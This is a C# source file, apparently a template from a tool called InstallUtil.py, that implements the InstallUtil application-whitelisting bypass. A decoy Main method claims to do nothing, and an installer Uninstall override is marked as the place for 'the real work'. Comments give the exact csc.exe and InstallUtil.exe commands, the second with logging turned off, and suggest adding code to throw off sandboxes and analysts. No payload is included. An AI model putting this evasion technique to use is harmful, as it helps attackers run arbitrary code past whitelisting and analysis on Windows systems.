/*Generated by InstallUtil.py, by @khr0x40sh*/
using System;
using System.Diagnostics;
using System.Configuration.Install;
/*
Author: Casey Smith, Twitter: @subTee
License: BSD 3-Clause

Step One:

C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe  /out:exeshell.exe exeshell.cs
Step Two:

C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U exeshell.exe
See https://gist.github.comsubTee/0dc27475f141cc3a1b50 for details.
*/
namespace Exec
{
	public class Program
	{

		public static void Main()
		{
			Console.WriteLine("Hello From Main...I Don't Do Anything");
			//Add any behaviour here to throw off sandbox execution/analysts :)

		}
	}

	[System.ComponentModel.RunInstaller(true)]
	public class Sample : System.Configuration.Install.Installer
	{
		//The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
		public override void Uninstall(System.Collections.IDictionary savedState)
		{
			Console.WriteLine("Hello From Uninstall...I carry out the real work..."); //debug
			

		}


	}
}
